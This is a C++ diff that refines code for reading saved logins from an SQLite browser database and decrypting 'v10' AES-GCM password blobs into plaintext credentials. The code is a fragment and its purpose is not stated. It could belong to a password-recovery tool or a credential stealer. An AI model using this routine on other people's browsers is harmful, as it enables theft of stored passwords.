@@ -114,16 +114,16 @@ static Buffer parse_key(const std::string& encrypted_key)
 static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
 {
 	static constexpr std::string_view PREFIX = "v10";
-	static constexpr size_t IV_LENGTH = 12;
+	static constexpr size_t GCM_IV_LENGTH = 12;
 
-	if (password.size() < PREFIX.size() + IV_LENGTH)
+	if (password.size() < PREFIX.size() + GCM_IV_LENGTH)
 	{
 		throw Exception(ErrorCode::INVALID_ARGUMENT);
 	}
 
-	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + IV_LENGTH};
+	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + GCM_IV_LENGTH};
 	const Buffer encrypted_password = {
-		password.begin() + PREFIX.size() + IV_LENGTH,
+		password.begin() + PREFIX.size() + GCM_IV_LENGTH,
 		password.end()
 	};
 
@@ -150,11 +150,17 @@ void test()
 		try
 		{
 			const SqliteRow row = iterator.current();
-			const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, std::string>(
+			const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, Buffer>(
 				row
 			);
-			Buffer raw_encrypted_password = Strings::to_buffer(password_value);
-			auto [iv, encrypted_password] = parse_password(raw_encrypted_password);
+
+			if (password_value.empty())
+			{
+				continue;
+			}
+
+			auto [iv, encrypted_password] = parse_password(password_value);
+
 			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
 
 			credentials.emplace_back(
